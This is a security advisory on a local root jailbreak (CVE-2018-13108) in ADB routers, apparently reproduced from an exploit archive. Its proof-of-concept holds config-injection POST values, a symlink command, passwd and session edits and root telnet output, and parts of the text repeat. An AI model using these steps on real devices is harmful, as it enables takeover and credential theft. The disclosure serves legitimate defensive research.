"Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions."

Business recommendation:
------------------------
By exploiting the local root vulnerability on affected and unpatched devices
an attacker is able to gain full access to the device with highest privileges.
Attackers are able to modify any settings that might have otherwise been
prohibited by the ISP. It is possible to retrieve all stored user credentials
(such as VoIP) or SSL private keys. Furthermore, attacks on the internal network
side of the ISP are possible by using the device as a jump host, depending on
the internal network security measures.

Network security should not depend on the security of independent devices,
such as modems. An attacker with root access to such a device can enable
attacks on connected networks, such as administrative networks managed by the
ISP or other users.

It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.

Vulnerability overview/description:
-----------------------------------
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
Most ADB devices offer USB ports in order for customers to use them for
printer or file sharing. In the past, ADB devices have suffered from symlink
attacks e.g. via FTP server functionality which has been fixed in more recent
firmware versions.

The "Network File Sharing" feature of current ADB devices via USB uses a samba
daemon which accesses the USB drive with highest access rights and exports the
network shares with root user permissions. The default and hardcoded setting
for the samba daemon within the smb.conf on the device has set "wide links =
no" which normally disallows gaining access to the root file system of the
device using symlink attacks via a USB drive.

But an attacker is able to exploit both a web GUI input validation and samba
configuration file parsing problem which makes it possible to access the root
file system of the device with root access rights via a manipulated USB drive.

The attacker can then edit various system files, e.g. passwd and session
information of the web server in order to escalate web GUI privileges and
start a telnet server and gain full system level shell access as root.

This is a local attack and not possible via remote access vectors as an
attacker needs to insert a specially crafted USB drive into the device!
Usually not even the ISPs themselves have direct root access on ADB devices
hence this attack is quite problematic for further internal attacks.

It is possible to change network routes and attack networks and systems within
the internal network of the ISP or add backdoors or sniffers to the device.

Furthermore, attackers are able to gain access to all stored credentials,
such as PPP, wireless, CPE management or VoIP passwords.

Proof of concept:
-----------------
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
The samba configuration file (smb.conf) of the ADB devices has set the
following default settings. All file system operations will be performed
by the root user as set in the "force user" / "force group" setting of the
exported share:

[global]
netbios name = HOSTNAME
workgroup = WORKGROUP
wide links = no
smb ports = 445 139
security = share
guest account = root
announce version = 5.0
socket options = TCP_NODELAY SO_RCVBUF=65536 SO_SNDBUF=65536
null passwords = yes
name resolve order = hosts wins bcast
wins support = yes
syslog only = yes
read only = no
hosts allow = 192.168.1.1/255.255.255.0
[share]
path = /mnt/sdb1/.
read only = false
force user = root
force group = root
guest ok = yes

An attacker can edit various values such as "netbios name" and "workgroup" via
the web GUI. The web GUI does some basic filtering and newlines are
unfortunately not allowed (the samba config file is line-based) hence a
special bypass has been crafted in order to change the default setting "wide
links = no" to "wide links = yes". This enables symlinks to the root file
system.

By using the following netbios name and workgroup, samba can be tricked into
allowing symlinks to the root file system of the device:
netbios domain / workgroup = =wide links = yes \ netbios name = wide links = yes
Relevant HTTP POST parameters:
&domainName==wide links = yes \ \ &hostName=wide+links+%3D+yes+%5C

According to the manpage of smb.conf, any line ending in a \ is continued by the
samba parser on the next line. Furthermore, it states that "Only the first
equals sign in a parameter is significant." - which it seems can be bypassed
by adding a backslash \. The parser now thinks that the "wide links = yes" has
been set and omits the hardcoded "wide links = no" which comes further down
below in the smb.conf file.

In order to add those special values within the web GUI a proxy server such as
burp proxy is needed because of basic input validation on the client side (not
server side).

The USB drive needs to be formatted to ext2 or ext3 which is supported by
the ADB device. Then create a symlink to the root file system via the
following command on the attacker's computer:
ln -s / /path/to/usbdevice/rootfs

After those settings have been changed and the USB drive has been set up,
the USB drive can be inserted into the ADB device. The USB volume needs to be
exported (with read/write permissions) as a share via the web GUI. Afterwards
it can be accessed over the network and the "rootfs" folder example from above
will give an attacker access to the ADB root file system with "read & write"
access permissions as root.

Most file systems / partitions on the device are mounted read-only per default,
but the most important one "/tmp" contains all settings and is mounted writable
for operations.

The defaut user "admin" usually has little access rights during normal
operations which can be changed by manipulating the session file of the web
server within /tmp/ui_session_XXX where XXX is the session id of the currently
logged on user, e.g. change:
from: access.dboard/settings/management/telnetserver =|> 2001
to: access.dboard/settings/management/telnetserver =|> 2220
etc. (or change all entries for maximum access level)

This way, an attacker can give himself all/highest access permissions within
the GUI and change all the settings of the device! Hence the telnet or SSH
server can be started even though they might have been disabled by the ISP.
Furthermore, the /tmp/passwd file has to be changed in order to allow root
access via shell/telnet:
change: root:*:0:0:root:/root:/bin/ash
to: root::0:0:root:/root:/bin/ash

Now telnet into the device with root and no password.
Example of an ADB DV2210 device:

Trying $IP...
Connected to $IP.
Escape character is '^]'.
Login root:

BusyBox v1.17.3 (2016-02-11 13:34:33 CET) built-in shell (ash)
Enter 'help' for a list of built-in commands.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

"Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions."

Business recommendation:
------------------------
By exploiting the local root vulnerability on affected and unpatched devices
an attacker is able to gain full access to the device with highest privileges.
Attackers are able to modify any settings that might have otherwise been
prohibited by the ISP. It is possible to retrieve all stored user credentials
(such as VoIP) or SSL private keys. Furthermore, attacks on the internal network
side of the ISP are possible by using the device as a jump host, depending on
the internal network security measures.

Network security should not depend on the security of independent devices,
such as modems. An attacker with root access to such a device can enable
attacks on connected networks, such as administrative networks managed by the
ISP or other users.

It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.

Vulnerability overview/description:
-----------------------------------
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
Most ADB devices offer USB ports in order for customers to use them for
printer or file sharing. In the past, ADB devices have suffered from symlink
attacks e.g. via FTP server functionality which has been fixed in more recent
firmware versions.

The "Network File Sharing" feature of current ADB devices via USB uses a samba
daemon which accesses the USB drive with highest access rights and exports the
network shares with root user permissions. The default and hardcoded setting
for the samba daemon within the smb.conf on the device has set "wide links =
no" which normally disallows gaining access to the root file system of the
device using symlink attacks via a USB drive.

But an attacker is able to exploit both a web GUI input validation and samba
configuration file parsing problem which makes it possible to access the root
file system of the device with root access rights via a manipulated USB drive.

The attacker can then edit various system files, e.g. passwd and session
information of the web server in order to escalate web GUI privileges and
start a telnet server and gain full system level shell access as root.

This is a local attack and not possible via remote access vectors as an
attacker needs to insert a specially crafted USB drive into the device!
Usually not even the ISPs themselves have direct root access on ADB devices
hence this attack is quite problematic for further internal attacks.

It is possible to change network routes and attack networks and systems within
the internal network of the ISP or add backdoors or sniffers to the device.

Furthermore, attackers are able to gain access to all stored credentials,
such as PPP, wireless, CPE management or VoIP passwords.

Proof of concept:
-----------------
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
The samba configuration file (smb.conf) of the ADB devices has set the
following default settings. All file system operations will be performed
by the root user as set in the "force user" / "force group" setting of the
exported share:

    [global]
    netbios name = HOSTNAME
    workgroup = WORKGROUP
    wide links = no
    smb ports = 445 139
    security = share
    guest account = root
    announce version = 5.0
    socket options = TCP_NODELAY SO_RCVBUF=65536 SO_SNDBUF=65536
    null passwords = yes
    name resolve order = hosts wins bcast
    wins support = yes
    syslog only = yes
    read only = no
    hosts allow =  192.168.1.1/255.255.255.0
    [share]
    path = /mnt/sdb1/.
    read only = false
    force user = root
    force group = root
    guest ok = yes

An attacker can edit various values such as "netbios name" and "workgroup" via
the web GUI. The web GUI does some basic filtering and newlines are
unfortunately not allowed (the samba config file is line-based) hence a
special bypass has been crafted in order to change the default setting "wide
links = no" to "wide links = yes". This enables symlinks to the root file
system.

By using the following netbios name and workgroup, samba can be tricked into
allowing symlinks to the root file system of the device:
netbios domain / workgroup = =wide links = yes \  \
netbios name = wide links = yes \

Relevant HTTP POST parameters:
&domainName==wide links = yes \  \ &hostName=wide+links+%3D+yes+%5C

According to the manpage of smb.conf, any line ending in a \ is continued by the
samba parser on the next line. Furthermore, it states that "Only the first
equals sign in a parameter is significant." - which it seems can be bypassed
by adding a backslash \. The parser now thinks that the "wide links = yes" has
been set and omits the hardcoded "wide links = no" which comes further down
below in the smb.conf file.

In order to add those special values within the web GUI a proxy server such as
burp proxy is needed because of basic input validation on the client side (not
server side).

The USB drive needs to be formatted to ext2 or ext3 which is supported by
the ADB device. Then create a symlink to the root file system via the
following command on the attacker's computer:
    ln -s / /path/to/usbdevice/rootfs

After those settings have been changed and the USB drive has been set up,
the USB drive can be inserted into the ADB device. The USB volume needs to be
exported (with read/write permissions) as a share via the web GUI. Afterwards
it can be accessed over the network and the "rootfs" folder example from above
will give an attacker access to the ADB root file system with "read & write"
access permissions as root.

Most file systems / partitions on the device are mounted read-only per default,
but the most important one "/tmp" contains all settings and is mounted writable
for operations.

The defaut user "admin" usually has little access rights during normal
operations which can be changed by manipulating the session file of the web
server within /tmp/ui_session_XXX where XXX is the session id of the currently
logged on user, e.g. change:
from: access.dboard/settings/management/telnetserver =|> 2001
to: access.dboard/settings/management/telnetserver =|> 2220
etc. (or change all entries for maximum access level)

This way, an attacker can give himself all/highest access permissions within
the GUI and change all the settings of the device! Hence the telnet or SSH
server can be started even though they might have been disabled by the ISP.
Furthermore, the /tmp/passwd file has to be changed in order to allow root
access via shell/telnet:
change: root:*:0:0:root:/root:/bin/ash
to: root::0:0:root:/root:/bin/ash

Now telnet into the device with root and no password.
Example of an ADB DV2210 device:

Trying $IP...
Connected to $IP.
Escape character is '^]'.
Login root:

BusyBox v1.17.3 (2016-02-11 13:34:33 CET) built-in shell (ash)

The parser now thinks that the “wide links = yes” has been set and omits the hardcoded “wide links = no” which comes further down below in the smb.conf file.

In order to add those special values within the web GUI a proxy server such as burp proxy is needed because of basic input validation on the client side (not server side).

The USB drive needs to be formatted to ext2 or ext3 which is supported by the ADB device. Then create a symlink to the root file system via the following command on the attacker’s computer:

***ln -s / /path/to/usbdevice/rootfs***

After those settings have been changed and the USB drive has been set up, the USB drive can be inserted into the ADB device. The USB volume needs to be exported (with read/write permissions) as a share via the web GUI. Afterwards it can be accessed over the network and the “rootfs” folder example from above will give an attacker access to the ADB root file system with “read & write” access permissions as root.

Most file systems / partitions on the device are mounted read-only per default, but the most important one “/tmp” contains all settings and is mounted writable for operations.

The defaut user “admin” usually has little access rights during normal operations which can be changed by manipulating the session file of the web server within /tmp/ui\_session\_XXX where XXX is the session id of the currently logged on user, e.g. change:

***from: access.dboard/settings/management/telnetserver =|> 2001 to: access.dboard/settings/management/telnetserver =|> 2220 etc. (or change all entries for maximum access level)***

This way, an attacker can give himself all/highest access permissions within the GUI and change all the settings of the device! Hence the telnet or SSH server can be started even though they might have been disabled by the ISP. Furthermore, the /tmp/passwd file has to be changed in order to allow root access via shell/telnet:

***change: root:\*:0:0:root:/root:/bin/ash to: root::0:0:root:/root:/bin/ash***

Now telnet into the device with root and **no** password. Example of an ADB DV2210 device:

***Trying $IP... Connected to $IP. Escape character is '^]'. Login root: BusyBox v1.17.3 (2016-02-11 13:34:33 CET) built-in shell (ash) Enter 'help' for a list of built-in commands. \_\_\_ \_\_\_ \_\_\_ \_\_\_ |\\_\_\ /\ \ /\ \ /\ \ |:| | /::\ \ /::\ \ /::\ \ |:| | /:/\:\ \ /:/\:\ \ /:/\:\ \ |:|\_\_|\_\_ /::\~\:\ \ /::\~\:\ \ \_\:\~\:\ \ /::::\\_\_\ /:/\:\ \:\\_\_\ /:/\:\ \:\\_\_\ /\ \:\ \:\\_\_\ /:/~~/~ \/\_\_\:\/:/ / \/\_\_\:\/:/ / \:\ \:\ \/\_\_/ /:/ / \::/ / \::/ / \:\ \:\\_\_\ \/\_\_/ /:/ / \/\_\_/ \:\/:/ / /:/ / \::/ / \/\_\_/ \/\_\_/ .................................................................. yet another purposeful solution by A D B Broadband .................................................................. root@$hostname:~# id uid=0(root) gid=0(root) groups=0(root) root@$hostname:~#***

## Vulnerable / Tested Versions

The following devices & firmware have been tested which were the most recent versions at the time of discovery.

The firmware versions depend on the ISP / customer of ADB and may vary!

* ADB P.RG AV4202N – E\_3.3.0, latest firmware version, depending on ISP
* ADB DV 2210 – E\_5.3.0, latest firmware version, depending on ISP
* ADB VV 5522 – E\_8.3.0, latest firmware version, depending on ISP
* ADB VV 2220 – E\_9.0.6, latest firmware version, depending on ISP
* etc.

It has been confirmed by ADB that **all** their ADB modems / gateways / routers based on the Epicentro platform with USB ports and network file sharing features are affected by this vulnerability in all firmware versions for all their customers (ISPs) at the time of identification of the vulnerability.

## Vendor Contact Timeline

| 2016-06-15: | Contacting vendor ADB, exchanging encryption keys & advisory. Asking about affected devices / firmware, timeline for hotfix. Fast initial response from ADB providing requested information |
| --- | --- |
| 2016-06-16: | Asking about other affected devices |
| 2016-06-17: | Resending previous question due to encryption problems |
| 2016-07-04: | Conference call |
| 2016-07 – 2017-04: | Further coordination, waiting for firmware release, implementation & rollout phases for their customers |
| 2018-07-04: | Embargo lifted, public release of security advisory |

## Solution

The firmware versions depend on the ISP / customer of ADB and may vary!

Patch version:

* ADB P.RG AV4202N >= E\_3.3.2, firmware version depending on ISP
* ADB DV2210 >= E\_5.3.2, firmware version depending on ISP
* ADB VV5522 >= E\_8.3.2, firmware version depending on ISP
* ADB VV2220 >= E\_9.3.2, firmware version depending on ISP
* Centro Business 1 >= 7.12.10
* Centro Business 2 >= 8.06.08
* etc.

## Workaround

Restrict access to the web interface and only allow trusted users.
 Change any default/weak passwords to strong credentials.
 Don’t allow remote access to the web GUI via Internet.
